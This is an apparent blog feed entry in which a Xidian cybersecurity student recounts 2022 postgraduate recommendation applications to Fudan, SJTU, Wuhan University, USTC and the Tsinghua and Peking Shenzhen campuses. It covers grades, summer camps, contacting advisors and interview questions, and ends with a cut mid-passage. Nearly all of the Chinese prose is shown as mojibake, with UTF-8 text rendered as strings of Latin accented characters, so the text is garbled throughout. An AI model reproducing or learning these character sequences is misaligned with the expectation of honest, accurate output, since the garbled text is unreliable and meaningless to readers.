      <title>2022-ç½‘å®‰ä¿ç ”ï¼ˆæ¸…æ·±å¤§æ•°æ®ã€å¤æ—¦ã€ä¸Šäº¤ã€ä¸­ç§‘å¤§ã€æ­¦å¤§ï¼‰</title>
      <link href="/2022/10/18/%E7%BB%8F%E9%AA%8C%E8%B4%B4-2022-%E7%BD%91%E5%AE%89%E4%BF%9D%E7%A0%94/"/>
      <url>/2022/10/18/%E7%BB%8F%E9%AA%8C%E8%B4%B4-2022-%E7%BD%91%E5%AE%89%E4%BF%9D%E7%A0%94/</url>
      
        <content type="html"><![CDATA[<p>åˆ†äº«ä¸€ç¯‡ä¿ç ”ç»éªŒè´´å¸Œæœ›å­¦å¼Ÿå­¦å¦¹ä»¬èƒ½å°‘èµ°å¼¯è·¯ã€‚</p><span id="more"></span><h1 id="ä¸ªäººèƒŒæ™¯">ä¸ªäººèƒŒæ™¯</h1><ul><li>å­¦æ ¡ï¼šè¥¿ç”µ</li><li>ä¸“ä¸šï¼šç½‘ç»œç©ºé—´å®‰å…¨ï¼ˆå®éªŒç­ï¼‰</li><li>æˆç»©ï¼š1 / 40</li><li>è‹±è¯­ï¼šå››çº§509ï¼Œå…­çº§509</li><li>å¥–å­¦é‡‘ï¼šä¸€æ¬¡å›½å¥–ï¼Œä¼˜ç§€å­¦ç”Ÿæ ‡å…µä¹‹ç±»çš„</li><li>ç»¼åˆæƒ…å†µï¼šå¯†ç èµ›å›½äºŒï¼ˆè‡ªå·±åšçš„æŒºæ°´ï¼‰ï¼Œæ•°æ¨¡å›½èµ›çœä¸€ã€ç¾èµ›Må¥–ã€â€œæ·±åœ³æ¯â€ä¸‰ç­‰å¥–â€¦â€¦ä¸€æ®µæ²¡äº§å‡ºä½†æ˜¯åšçš„å¾ˆæœ‰è¶£çš„ç§‘ç ”/ç»å†ï¼Œæ— è®ºæ–‡ï¼Œæ— ä¸“åˆ©ã€‚æ€»çš„æ¥è¯´ï¼Œä¸å¾—ä¸æ‰¿è®¤è‡ªå·±ä¹Ÿæ˜¯GPAçŒæ°´fiveä¸€æšï¼</li></ul><h1 id="ç”³è¯·å­¦æ ¡">ç”³è¯·å­¦æ ¡</h1><h2 id="åŸºæœ¬å‡ºå‘ç‚¹">åŸºæœ¬å‡ºå‘ç‚¹</h2><ul><li><p>ä¸ç›´åšã€æœ€å¥½å­¦ç¡•ï¼ˆä¸“ç¡•å­¦è´¹ä¸è´µä¹Ÿè¡Œï¼‰</p><blockquote><p>å¼ºç»„å¯¼å¸ˆäººä¹Ÿå¥½åº”è¯¥å¯ä»¥è€ƒè™‘ç›´åšçš„ï¼Œä¸€èˆ¬å¯¼å»ºè®®è¿˜æ˜¯ç®—äº†ï¼Œä¸è¿‡å¼ºç»„ç›´åšå¯èƒ½æ¯”ç¡•å£«è¿˜éš¾ã€‚æ€»ä¹‹ä¸è¦è°ˆç›´åšè‰²å˜ï¼Œæ„Ÿè§‰æ¸…åŒ—æ›´æ„¿æ„åœ¨æœ¬éƒ¨æ‹›æ”¶ç›´åšç”Ÿï¼Œåœ¨æ·±åœ³å’ŒåŒ—å¤§è½¯å¾®æ„¿æ„å»æ‹›æ”¶ç¡•å£«ï¼ˆä¸è¿‡æ¸…åç½‘ç ”é™¢æ‹¿åˆ°å­¦ç¡•æœºä¼šè¿˜æ¯”è¾ƒå¤§ï¼‰ã€‚å¦‚æœè‡ªå·±ç¡®å®æœ‰å­¦æœ¯è¿½æ±‚ã€æœ‰è¿‡æ­£ç»çš„ç§‘ç ”ç»å†å°±å¯ä»¥å»è”ç³»è€å¸ˆï¼Œå¯ä»¥å®ä¹ ä¸‹è¯•è¯•ã€‚</p></blockquote></li><li><p>å­¦æ ¡Title &gt; æ–¹å‘&amp;å¯¼å¸ˆ &gt; åœ°åŸŸ &gt; å­¦æ ¡ç¯å¢ƒå’Œç”Ÿæ´»æ¡ä»¶</p><blockquote><p>å­¦æ ¡titleä¼šè·Ÿè‡ªå·±ä¸€è¾ˆå­ï¼Œèƒ½å»æ¸…åŒ—å°±æ¸…åŒ—å§ï¼Œä¹‹å‰è¿˜è§‰å¾—ä¸Šäº¤ç½‘å®‰å¯èƒ½æ¯”æ¸…åç½‘ç ”é™¢å¥½ï¼ˆç½‘ç ”é™¢å¤§æ–¹å‘ä¸å–œæ¬¢ï¼‰ï¼Œä½†å…¶å®æ¸…åŒ—å’Œå…¶ä»–å­¦æ ¡è¿˜æ˜¯æœ‰æ–­å´–å¼å·®è·ï¼Œä¸è¿‡å¦‚æœèƒ½æ‰¾åˆ°ä¸Šäº¤zhjã€æµ™å¤§zyjè¿™ç±»è°å»éƒ½ä¸ä¼šåæ‚”çš„ç‰›å¯¼ä¹Ÿä¸æ¯”æ¸…åŒ—å·®ã€‚æƒ³å»ç‰›å¯¼å°±æ—©ç‚¹è”ç³»è€å¸ˆï¼Œè®¤çœŸå¯¹å¾…è€å¸ˆå®‰æ’çš„ä»»åŠ¡å§ï¼ˆä¸€èˆ¬å°±æ˜¯é˜…è¯»è®ºæ–‡+é¡¶ä¼šå¤ç°ï¼‰ã€‚</p></blockquote></li><li><p>æ¸…åæœ¬éƒ¨æœºè¯•éš¾åº¦è¾ƒå¤§ï¼Œä¸Šäº¤å…¶ä»–å­¦æ ¡ç½‘å®‰ç‰›å¯¼å¾ˆå¤šåœ¨è®¡é™¢ï¼Œæ˜¯æœ‰æœºè¯•çš„ï¼Œæ‰€ä»¥å¦‚æœæƒ³è¯»ç¡•å£«ï¼Œä¸€å®šè¦å¥½å¥½ç»ƒæœºè¯•ã€‚</p><blockquote><p>å¦‚æœè‡ªå·±æ„Ÿè§‰å¯¹æœºè¯•æ²¡æœ‰æ‰“ç®—ï¼Œæ„Ÿè§‰å¾ˆéš¾ä¸‹æ‰‹ï¼Œä¸å¦‚æŠŠç›®æ ‡å…·ä½“åŒ–ï¼šyæ€»è¯´åˆ·å®Œacwingç®—æ³•æé«˜é¢˜é€šè¿‡æ¸…åæœºè¯•å°±åŸºæœ¬æ²¡å•¥é—®é¢˜ã€‚å¦‚æœæƒ³è¯»ç¡•å£«å°±å¥½å¥½ç»ƒå§ï¼Œå¤¹æ‚ä¸ªç§è´§å¦‚ä¸‹ï¼ˆå­¦é•¿å®£ä¼ é‚€è¯·åªèƒ½è·å¾—ä¼˜æƒ åˆ¸-&gt;è‚¯å®šè§‰å¾—è¯¾å¥½æ‰ä¼šæƒ³ç€å†ä¹°è¯¾ï¼‰ï¼š</p><p>AcWingã€ACä¹‹æ˜Ÿã€‘æ•™è‚²ä¼˜æƒ è®¡åˆ’ï¼<a href="https://www.acwing.com/user/security/school_verify/ac_stars/">acwing.com</a> æˆ‘çš„é‚€è¯·ç æ˜¯ï¼šLODKZ</p></blockquote></li><li><p>æœ¬äººèƒ†å­æœ‰ç‚¹å°ï¼Œæ¸…åŒ—ä¸æ•¢æŠ¥ï¼Œç›´åšä¸æ•¢æŠ¥ï¼Œä¸å¤ªæ•¢æå‰è”ç³»è€å¸ˆï¼Œç›´åˆ°æ¸…åæŠ¥åæœ€åä¸€å¤©æ‰è¢«ä¸Šäº¤æ‹›ç”ŸåŠæ°”å¾—åŒ†åŒ†æŠ¥äº†æ¸…æ·±å¤§æ•°æ®ï¼Œå…¶å®æ²¡è¯•æ¸…åŒ—æœ¬éƒ¨æœ‰ç‚¹é—æ†¾çš„ã€‚</p><blockquote><p>ä¸è¦å› ä¸ºè‡ªå·±é€šè¿‡å­¦æ ¡è€ƒæ ¸çš„æŠŠæ¡ä¸å¤§å°±ä¸æ•¢è”ç³»è€å¸ˆï¼Œè”ç³»å¥½è€å¸ˆçš„å¥½å¤„è‡³å°‘æœ‰2ç‚¹ï¼š1ã€é¢è¯•æ—¶ä»–å°±åœ¨ç°åœºï¼Œå¸®ä½ è¯´ä¸€å¥è¿™å­¦ç”Ÿè¿˜æ˜¯ä¸é”™çš„å•¥çš„ï¼Œå…¶ä»–è€å¸ˆå°±éƒ½æ‡‚äº†ï¼›2ã€å¯èƒ½è¿‡äº†å¤è¯•å¿ƒä»ªè€å¸ˆå°±è¢«åˆ«äººè”ç³»èµ°äº†ã€‚æ‰€ä»¥å¦‚æœçœŸæ˜¯å¿ƒä»ªè€å¸ˆï¼Œå°±ä¸è¦æ€•æ‰“æ‰°è€å¸ˆï¼Œåˆè¯•å‰ã€å¤è¯•å‰ã€å¤è¯•åå„å‘ä¸€æ¬¡é‚®ä»¶ï¼Œå‰2æ¬¡æ²¡è”ç³»ä¸Šæ­£å¸¸ï¼Œè¿‡äº†å¤è¯•è¿˜æ˜¯è¿˜ä¸å›è¯·é©¬ä¸Šè”ç³»å…¶ä»–è€å¸ˆã€‚</p></blockquote></li></ul><h2 id="å¤ä»¤è¥ç”³è¯·">å¤ä»¤è¥ç”³è¯·</h2><p>2022å¤ä»¤è¥æŠ¥åå’Œæˆªæ­¢æ—¥æœŸï¼š<a href="https://github.com/LinghaoChan/CSSummerCamp2022">CSSummerCamp2022</a></p><blockquote><p>2023çš„åˆ°æ—¶æŠŠä»“åº“åä¸­â€œ2022â€æ”¹ä¸ºâ€2023â€œåº”è¯¥å°±æ˜¯å§ã€‚<strong>å»ºè®®æŠŠâ€œä¿ç ”å°ç™½å¿…çœ‹ç»éªŒè´´â€é‡Œå†…å®¹çœ‹ä¸€é</strong>ï¼Œå›æƒ³èµ·æ¥è¿˜æ˜¯å¾ˆæœ‰é“ç†ï¼Œå¾ˆå¤šè€å¸ˆgoogleä¸»é¡µéƒ½æ²¡æœ‰ï¼Œè¿‘ä¸‰å¹´dblpéƒ½æ²¡å¤šå°‘æ–‡ç« ï¼Œå¯èƒ½å°±æ˜¯è½¬è¡Œæ”¿äº†ï¼Œå¦‚æœæƒ³è¯»åšå°±ä¸æ¨èäº†ã€‚</p></blockquote><p>å½“æ—¶ç›¸ä¿¡è‡ªå·±èƒ½è¿›ä¸Šäº¤ï¼Œæ‰€ä»¥æŠ¥çš„å­¦æ ¡ä¹Ÿä¸å¤šã€‚</p><table><thead><tr><th style="text-align:center">å­¦æ ¡</th><th style="text-align:center">å­¦é™¢/é¡¹ç›®</th><th style="text-align:center">åˆå®¡</th><th style="text-align:center">è€ƒæ ¸</th><th style="text-align:center">å¤‡æ³¨</th></tr></thead><tbody><tr><td style="text-align:center">å¤æ—¦fdu</td><td style="text-align:center">è®¡ç®—æœºå­¦é™¢ ç½‘å®‰</td><td style="text-align:center">è¿‡</td><td style="text-align:center">æœºè¯•å¤ªå·®ï¼ŒæŒ‚</td><td style="text-align:center">æ²¡è”ç³»è€å¸ˆ</td></tr><tr><td style="text-align:center">ä¸Šäº¤sjtu</td><td style="text-align:center">ç”µé™¢ ç½‘å®‰</td><td style="text-align:center">è¿‡</td><td style="text-align:center">å­¦ç¡•</td><td style="text-align:center">è”ç³»åˆ°äº†å¿ƒä»ªçš„å¯¼å¸ˆ</td></tr><tr><td style="text-align:center">æ­¦å¤§whu</td><td style="text-align:center">ç½‘å®‰å­¦é™¢ ç½‘å®‰</td><td style="text-align:center">è¿‡</td><td style="text-align:center">å­¦ç¡•</td><td style="text-align:center">æ²¡è”ç³»è€å¸ˆ</td></tr><tr><td style="text-align:center">ä¸­ç§‘å¤§ustc</td><td style="text-align:center">ç½‘å®‰å­¦é™¢ ç½‘å®‰</td><td style="text-align:center">è¿‡</td><td style="text-align:center">å­¦ç¡•</td><td style="text-align:center">æ²¡è”ç³»è€å¸ˆ</td></tr></tbody></table><h2 id="é¢„æ¨å…ç”³è¯·">é¢„æ¨å…ç”³è¯·</h2><p>2022é¢„æ¨å…æŠ¥åå’Œæˆªæ­¢æ—¥æœŸï¼š<strong><a href="https://github.com/CS-BAOYAN/CSYuTuiMian2022">CSYuTuiMian2022</a></strong></p><p>æœ¬æ¥å·²ç»è®¡åˆ’å»ä¸Šäº¤äº†ï¼Œä½†æ˜¯æˆ‘ç­‰ä¸Šäº¤è¿‘2ä¸ªæœˆäº†ï¼Œç›´åˆ°8æœˆ31æ—¥ä¸Šäº¤è¿˜ä¸å‘Šè¯‰æˆ‘å­¦ç¡•è¿˜æ˜¯ä¸“ç¡•ï¼Œäºæ˜¯åœ¨æ¸…åæŠ¥åå‰ä¸€å¤©æŠ¥äº†æ¸…æ·±å¤§æ•°æ®ï¼Œè®¡åˆ’é¢„æ¨å…å†²å†²æ¸…åŒ—ã€‚</p><table><thead><tr><th style="text-align:center">å­¦æ ¡</th><th style="text-align:center">å­¦é™¢/é¡¹ç›®</th><th style="text-align:center">åˆå®¡</th><th style="text-align:center">è€ƒæ ¸</th><th style="text-align:center">å¤‡æ³¨</th></tr></thead><tbody><tr><td style="text-align:center">æ¸…åthu</td><td style="text-align:center">æ·±ç ”é™¢ å¤§æ•°æ®</td><td style="text-align:center">è¿‡</td><td style="text-align:center">ä¸“ç¡•</td><td style="text-align:center">æ²¡è”ç³»è€å¸ˆ</td></tr><tr><td style="text-align:center">åŒ—å¤§pku</td><td style="text-align:center">æ·±ç ”é™¢ è®¡ç®—æœº</td><td style="text-align:center">æœªè¿‡</td><td style="text-align:center"></td><td style="text-align:center">æ²¡å°è¯•è”ç³»è€å¸ˆï¼Œæ²¡äººæ¨è</td></tr></tbody></table><p>å½“è¿˜æŒºæƒ³å»åŒ—æ·±zysè€å¸ˆé‚£ï¼Œè€Œä¸”åŒ—æ·±è®¡ç®—æœºéƒ½æ˜¯0812å­¦ç¡•ï¼Œä½†æ˜¯æˆ‘æ²¡å‚åŠ å¤ä»¤è¥ï¼Œè”ç³»è€å¸ˆä¹Ÿå¤ªæ™šï¼Œæ²¡è”ç³»ä¸Šï¼Œæ®è¯´zè€å¸ˆå…«æœˆåº•å°±ä¼šå¯¹åŒå­¦è¿›è¡Œè€ƒæ ¸ã€‚åŒ—æ·±æ˜¯å¼±comï¼ŒåŒä¸“ä¸šå¦ä¸€ä½åŒå­¦è”ç³»ä¸Šäº†ï¼Œæ‰€ä»¥æˆ‘æ²¡è¿‡åˆå®¡ï¼Œå¥¹è¿‡äº†ã€‚</p><p>æ¸…æ·±æ®è¯´æ¯”åŒ—æ·±ç”Ÿæºå¥½ã€baré«˜ï¼Œè™½ç„¶æ¸…æ·±æ²¡æœ‰å¾ˆå¯¹å£çš„è€å¸ˆï¼Œä½†è¿˜æ˜¯æŠ¥äº†ã€‚</p><blockquote><p>è·¨è€ƒè”ç³»è€å¸ˆå¾ˆåƒåŠ›ï¼ŒæŠ˜è…¾äº†ä¸€ä¸ªæœˆè¿‘æ—¥ç»ˆäºè”ç³»åˆ°äº†ä¸€ä¸ªäººå¾ˆå¥½çš„è€å¸ˆï¼Œå‰å®³åˆè°¦è™šï¼Œä¹Ÿèƒ½è®©æˆ‘ç»§ç»­åšå®‰å…¨ï¼Œå¯¹æˆ‘æ¥è¯´ç®—æ˜¯æœ€å¥½çš„å»å¤„ã€‚</p></blockquote><p>åŒ—å¤§è®¡é™¢æ²¡æœ‰æœºè¯•ï¼Œç›´åšåé¢æ¯”å­¦ç¡•å¤šï¼Œä¹‹å‰ä¸€ç›´ä»¥ä¸ºæ²¡æœ‰åšå®‰å…¨çš„è€å¸ˆï¼ˆç¡®å®å°‘ï¼‰ï¼Œä½†æ˜¯æœ€è¿‘å’Œnudtçš„åŒå­¦äº¤æµäº†è§£åˆ°äº†xtè€å¸ˆã€‚è€å¸ˆåšè½¯ä»¶çš„ã€å­¦æœ¯æ°´å¹³æé«˜ã€å­¦æœ¯è®¨è®ºç›´æ¥ã€å¯¹å­¦ç”Ÿå¥½ã€è™½ç„¶å¿™ä½†å¾®ä¿¡å›æ¶ˆæ¯å¿«â€¦â€¦æ‰€ä»¥ä¸è¦æ²¡è®¤çœŸçœ‹æ¸…åŒ—æ‰€æœ‰è€å¸ˆä¸»é¡µå°±ç›´è§‚ä¸Šä»¥ä¸ºæ²¡è€å¸ˆåšè‡ªå·±å–œæ¬¢çš„æ–¹å‘ã€‚</p><h1 id="ä¿ç ”ç»å†">ä¿ç ”ç»å†</h1><blockquote><p>ä»¥é¢è¯•æ—¶é—´é¡ºåºä¸ºåº</p></blockquote><h2 id="å¤æ—¦ç½‘å®‰">å¤æ—¦ç½‘å®‰</h2><p>æŠ¥åæœ€åä¸€å¤©æ‰åŒ†åŒ†æŠ¥åï¼ŒæŠ¥ååæ²¡è®¤çœŸçœ‹è€å¸ˆæ–¹å‘ï¼Œç»“æœå‘ç°å¥½åƒè‡ªå·±å¥½åƒæ‰¾ä¸åˆ°æ„Ÿå…´è¶£çš„è€å¸ˆï¼Œæ‰€ä»¥æœ‰ç‚¹æ‘†ã€‚</p><p>å¤æ—¦ç½‘å®‰å’Œæ¸…åç½‘ç ”é™¢æ˜¯ä¸ºæ•°ä¸å¤šçš„æœ‰æœºè¯•çš„ç½‘å®‰å­¦é™¢ï¼Œå°è¶´èœæ²¡æœ‰å¥½å¥½å¬å­¦å§è¯ï¼Œæ²¡ç»ƒæœºè¯•ï¼Œç»“æœåšçš„å¾ˆå·®ï¼Œæœ€åå¹²è„†æ‘†çƒ‚æ²¡äº¤æŠ¥å‘Šï¼ˆå…¶å®æš´åŠ›åšçš„äº¤ä¸ªæŠ¥å‘Šä¹Ÿè¡Œå‘€ï¼‰ã€‚çœ‹å®Œacwingç®—æ³•åŸºç¡€é¢˜åæ„Ÿè§‰å…¶å®èƒ½åšçš„ï¼Œæ‰€ä»¥æ—©ç‚¹è·Ÿyæ€»å¥½å¥½å­¦å§ã€‚è™½ç„¶æœºè¯•ä¸ç®—åˆ†ï¼Œä½†æ˜¯åé¢è€å¸ˆæ‰“åˆ†åŸºæœ¬ä¸Šæ ¹æ®æœºè¯•æˆç»©æ‰“åˆ†æ¥çš„ï¼Œæ‰€ä»¥æœ‰æœºè¯•çš„åŸºæœ¬æœºè¯•å°±å†³å®šäº†æˆè´¥ã€‚</p><p>å¤æ—¦è‹±æ–‡é¢è¯•æ˜¯å¾ˆéš¾å‡†å¤‡çš„ï¼ŒèƒŒä¸ªè‡ªæˆ‘ä»‹ç»ç„¶åéšä¾¿èŠçš„ï¼Œæˆ‘è§‰å¾—èŠé¡¹ç›®æˆ–è€…ä¸“ä¸šçŸ¥è¯†å¾ˆè½»æ¾ï¼Œé—®äº†æˆ‘è”é‚¦å­¦ä¹ å’ŒåŒæ€åŠ å¯†æ˜¯ä»€ä¹ˆï¼ˆé¡¹ç›®ç”¨åˆ°äº†ï¼‰ï¼›ä½†æ˜¯èŠç”Ÿæ´»ä¸Šçš„å°±å¾ˆéš¾ç­”å¥½ï¼Œé—®äº†å¦‚æœä½ å¾ˆåŠªåŠ›ä½†æ˜¯è¿˜æ˜¯å¤±è´¥äº†ä¼šæ€æ ·ï¼ˆé¢è¯•èƒŒæ™¯å¢™ä¸Šæœ‰å¥â€œæˆ‘èƒ½è¡Œï¼ŒI CAN DO ITâ€ï¼Œè¿™ä¸ªé—®é¢˜åœ¨æ­¦å¤§é¢è¯•ä¹Ÿè¢«é—®äº†ï¼‰ã€‚æ€»ä¹‹å°±æ˜¯æ²‰ç€å†·é™å¾®ç¬‘ç€å»èŠå§ï¼Œå’±è¿™è‹±è¯­ä¸€ä¸‹ä¹Ÿæå‡ä¸äº†ã€‚</p><p>ç»¼åˆé¢è¯•ä¸éœ€è¦å‡†å¤‡PPTï¼Œä¸»è¦é—®æœºè¯•å’ŒæŠ½çš„ä¸“ä¸šé—®é¢˜ï¼Œä¸“ä¸šé—®é¢˜é—®äº†ï¼šCAç»™é“¶è¡Œä¸­é¢å‘çš„è¯ä¹¦ä¸­æœ‰ä»€ä¹ˆã€ç„¶åé—®äº†æˆ‘ä¸€äº›ç§»åŠ¨ç«¯å®‰å…¨çš„æ¦‚å¿µâ€¦â€¦å…¶ä»–çš„å¿˜äº†ï¼ŒçŸ¥é“çš„å°±æŠŠçŸ¥é“çš„éƒ½è¯´å‡ºæ¥ï¼Œä¸çŸ¥é“çš„å°±è¯´ä¸çŸ¥é“å§ã€‚</p><h2 id="ä¸Šäº¤ç½‘å®‰">ä¸Šäº¤ç½‘å®‰</h2><p>ä¸Šäº¤ç½‘å®‰å¯¹è¥¿ç”µå¾ˆå‹å¥½ï¼Œæˆ–è€…è¯´å…¨å›½çš„ç½‘å®‰é™¢æ ¡å¯¹è¥¿ç”µéƒ½è¾ƒå‹å¥½ï¼Œå› ä¸ºæœ€æ—©å…¨å›½åªæœ‰ä¸¤ä¸ªå¯†ç å­¦åšå£«å­¦ä½æˆäºˆç‚¹ï¼Œä¸€ä¸ªåœ¨ä¿¡æ¯å·¥ç¨‹å¤§å­¦ï¼ˆå†›æ ¡)ï¼Œä¸€ä¸ªåœ¨è¥¿ç”µã€‚æ¯å¹´è¥¿ç”µå»ä¸Šäº¤ç½‘å®‰çš„å­¦ç”Ÿéƒ½ä¸å°‘ï¼Œèƒ½æ‹¿åˆ°å­¦ç¡•çš„ä¹Ÿä¸å°‘ï¼ŒåŠ ä¸Šå¬å­¦é•¿å­¦å§è¯´è€å¸ˆä»¬äººå¾ˆå¥½ï¼Œæ‰€ä»¥ä¸€ç›´å¾ˆæƒ³å»ã€‚</p><p>æˆ‘ç›´åˆ°è¿‡äº†åˆè¯•æ‰å’Œå¿ƒä»ªè€å¸ˆå‘é‚®ä»¶ï¼ˆå½“æ—¶æœ‰ä¸ªä¸€èµ·åšé¡¹ç›®çš„é˜Ÿå‹ï¼Œæ‹¿ç€æˆ‘å’Œå¦ä¸€ä¸ªé˜Ÿå‹åšçš„å·¥ä½œï¼Œæ—©æ—©å»è”ç³»è¿™ä¸ªè€å¸ˆï¼Œç„¶åä¸€ç›´æå¾—æˆ‘æŒºç—›è‹¦çš„ï¼‰ï¼Œä¸è¿‡æˆ‘å‘äº†é‚®ä»¶åè€å¸ˆå¾ˆå¿«å¯¹æˆ‘è¡¨ç¤ºæ„Ÿå…´è¶£ï¼Œæˆ‘å½“æ—¶å‚»äº†å§å”§çš„æ²¡é—®è€å¸ˆè¦ä¸ªå¾®ä¿¡ï¼Œä½†æ˜¯è€å¸ˆå›æˆ‘é‚®ä»¶è®©æˆ‘é‚£æ®µæ—¶é—´å¿ƒæ€å¥½äº†å¾ˆå¤šã€‚</p><p>ä»Šå¹´ç”±äºç–«æƒ…ä¸èƒ½çº¿ä¸‹é¢è¯•ï¼Œæ‰€ä»¥å–æ¶ˆäº†ç¬”è¯•ï¼Œæ”¹ä¸ºé¢è¯•æ—¶æŠ½ä¸‰ä¸ªä¸“ä¸šé¢˜ã€‚æˆ‘æŠ½åˆ°çš„é—®é¢˜æ¯”è¾ƒç®€å•ï¼š1ã€é™æ€æ£€æµ‹ç—…æ¯’å’ŒåŠ¨æ€æ£€æµ‹æœ‰å•¥åŒºåˆ«ï¼›2ã€ä¿¡æ¯ç†µçš„å®šä¹‰ï¼›3ã€å¦‚æœç¾å›½å¯¹ä¸­å›½å°ç¦äº†æ ¹åŸŸåæœåŠ¡å™¨å°†å¯¹ä¸­å›½äº§ç”Ÿä»€ä¹ˆæ ·çš„å½±å“ã€‚è™½ç„¶éƒ½æ²¡ä¸“é—¨å­¦è¿‡ï¼Œä½†æ˜¯éƒ½ç­”ä¸Šæ¥äº†ã€‚æˆ‘é¢è¯•çš„å¾ˆè½»æ¾ï¼Œæ²¡æœ‰é—®å¾ˆæ·±çš„é¡¹ç›®ç»†èŠ‚ï¼ˆä¹‹å‰å­¦é•¿å­¦å§å¥½åƒå¬è¯´åœ¨ä¸Šäº¤è¢«é—®çš„æ¯”è¾ƒç»†ï¼‰ï¼Œæˆ‘æ„Ÿè§‰èŠçš„å¤ªç®€å•å¯èƒ½æ‰“åˆ†å¾ˆéš¾å¾ˆé«˜ï¼Œæ‰€ä»¥ä¸»åŠ¨è°ˆè‡ªå·±çš„ç†è§£ï¼ŒæŠŠé—®é¢˜èŠæ·±ä¸€ç‚¹ã€‚åŠ ä¸Šé¢è¯•å‰å­¦å§æé†’æˆ‘â€œè‡ªä¿¡å¤§æ–¹â€ã€é¢è¯•å‰ä¸€æ™šæˆ‘å§è¿˜ä¸“é—¨ç»™æˆ‘æ¨¡æ‹Ÿé¢è¯•ï¼Œæ‰€ä»¥æ•´ä½“é¢è¯•ä¸‹æ¥æ„Ÿè§‰è‰¯å¥½ï¼Œé¢è¯•åæœ‰è€å¸ˆè®©æˆ‘åŠ å¾®ä¿¡ï¼Œå‘Šè¯‰æˆ‘è¡¨ç°è¿˜ä¸é”™ã€‚ï¼ˆæ³¨æ„åˆšåŠ è€å¸ˆæ—¶è¦æ³¨æ„ç¤¼è²Œï¼Œä¸è¦æ¿€åŠ¨è¿‡å¤´äº†ï¼‰</p><p>æš‘å‡å‰å¤•è€å¸ˆç»™æˆ‘æ¨äº†å¸ˆå…„å¾®ä¿¡ï¼Œç»™äº†æ¯•è®¾é¢˜ç›®ï¼Œå¸ˆå…„å’Œè€å¸ˆäººéƒ½å¾ˆå¥½ï¼Œæ°›å›´æ„Ÿè§‰å¾ˆå¥½ï¼Œæ–¹å‘ä¹Ÿå¾ˆå–œæ¬¢ï¼Œæ‰€ä»¥æš‘å‡æœ‰ç‚¹èººå¹³ï¼ŒåŠ ä¸Šé™†é™†ç»­ç»­æ‹”äº†ä¸‰é¢—æ™ºé½¿ï¼Œä¸ºäº†ç¼“è§£ç–¼ç—›æ‰“èµ·äº†æ¸¸æˆå˜¿å˜¿ï¼Œæ‰€ä»¥æš‘å‡æ—¶å°±å†³å®šå»ä¸Šäº¤äº†ã€‚å½“æ—¶å¸ˆå…„é—®è¿‡æˆ‘ä¸€æ¬¡å†³å®šå»ä¸Šäº¤æ²¡ï¼Œæˆ‘å½“æ—¶å…¶å®è§‰å¾—80%å‡ ç‡å»ä¸Šäº¤ï¼Œä½†è¿˜æ˜¯è°¨æ…çš„å‘Šè¯‰å¸ˆå…„é¢„æ¨å…æ—¶æƒ³è¯•è¯•æ¸…åï¼Œå½“æ—¶å‘Šè¯‰çˆ¸å¦ˆåä»–ä»¬ä¸€ç›´è¯´æˆ‘å˜´ç¬¨è®©æˆ‘å…ˆç­”åº”è›®ï¼Œè‡ªå·±å½“æ—¶ä¹Ÿæœ‰ç‚¹åæ‚”å§ã€‚ä¸è¿‡è¿˜å¥½æ­£å› ä¸ºè‡ªå·±çš„è¯šå®ï¼Œåé¢æ‰æ•¢å‚åŠ æ¸…æ·±çš„é¢„æ¨å…ã€‚</p><h2 id="æ­¦å¤§ç½‘å®‰">æ­¦å¤§ç½‘å®‰</h2><p>æ­¦å¤§å› ä¸ºç¦»å®¶è¿‘æ‰€ä»¥è¿˜æŒºæƒ³å»çš„ï¼Œä¸è¿‡ä¸Šäº¤é¢å®Œè§‰å¾—èƒ½å»ä¸Šäº¤è‚¯å®šä¸Šäº¤ï¼Œæ²¡æœ‰æå‰è”ç³»è€å¸ˆã€‚</p><p>é¢è¯•æŒºè½»æ¾å§ï¼Œæœ¬æ¥æ²¡è®©æˆ‘æ”¾PPTï¼Œç„¶åæˆ‘ä¸»åŠ¨å’Œè€å¸ˆè¯´èƒ½ä¸èƒ½å…±äº«ä¸‹ï¼ˆè§‰å¾—è‡ªå·±ç”¨latexåšçš„beamerè¿˜ç®—å¥½çœ‹ï¼‰ï¼Œä¸»è€ƒå®˜æ¬£ç„¶è¯´å¥½ï¼Œåé¢èŠçš„å¾ˆè½»æ¾ï¼Œè‹±è¯­é—®ç­”èŠé¡¹ç›®é—®çš„æœ‰ç‚¹å¿«ï¼Œä½†è¿˜æ˜¯é€šè¿‡â€œprivacyâ€å’Œâ€œrobustnessâ€ç­‰å…³é”®è¯çŒœå‡ºäº†å¤§æ„ï¼Œä¸­æ–‡é—®ç­”æˆ‘åªè®°å¾—è®©æˆ‘å›ç­”paillieråŒæ€åŠ è§£å¯†å…¬å¼æ—¶ï¼ˆé¡¹ç›®ä¸­ç”¨åˆ°äº†ï¼‰ï¼Œæˆ‘è§£å¯†å…¬å¼æœ‰ç‚¹å¿˜äº†ï¼Œç„¶ååé¢è¿˜èŠåˆ°äº†æˆ‘èƒŒæ™¯å¢™ä¸Šçš„é‚£å¥â€œæˆ‘èƒ½è¡Œâ€ã€‚æ€»çš„æ¥è¯´é¢å®Œä¸Šäº¤æ¯”è¾ƒæ”¾æ¾ï¼Œè‡ªå·±è¡¨ç°çš„ä¹Ÿè¿˜å¯ä»¥å§ã€‚</p><h2 id="ä¸­ç§‘å¤§ç½‘å®‰">ä¸­ç§‘å¤§ç½‘å®‰</h2><p>ä¸­ç§‘å¤§å¬è¯´ç¯å¢ƒå¥½ï¼Œé¢è¯•æå‰æå¥½ï¼Œä¼˜è¥ç‡é«˜ï¼Œæ‰€ä»¥æƒ³ç€æŠ¥äº†ä¿åº•ã€‚</p><p>ä¸Šä¸€å±Šå®éªŒç­ç¬¬ä¸€å­¦å§å°±ä¸­ç§‘å¤§æ²¡å…¥è¥ï¼Œå¯èƒ½æ˜¯ä¸­ç§‘å¤§è§‰å¾—æ˜¯oqå§ï¼Œæˆ‘è§‰å¾—å¯ä»¥æå‰è”ç³»ä¸‹è€å¸ˆï¼Œæˆ‘ä»¬è¿™å±Šæœ‰æ’å7/40å·¦å³çš„åŒå­¦æå‰è”ç³»å¥½è€å¸ˆæœ€åæ‹¿åˆ°äº†å­¦ç¡•ã€‚ä¸­ç§‘å¤§è¿™è¾¹è€å¸ˆæŒºå¤šè€å¸ˆåšé‡å­è®¡ç®—å’Œæ•°å­¦çš„ï¼Œæˆ‘æ¯”è¾ƒæƒ³è”ç³»çš„æ˜¯åšåˆ†å¸ƒå¼æœºå™¨å­¦ä¹ çš„zpyè€å¸ˆï¼Œä¸è¿‡ç”±äºå‘¨å›´æœ‰åŒå­¦è”ç³»ä¸Šäº†zè€å¸ˆï¼ŒåŠ ä¸Šæƒ³å»ä¸Šäº¤çš„åŸå› 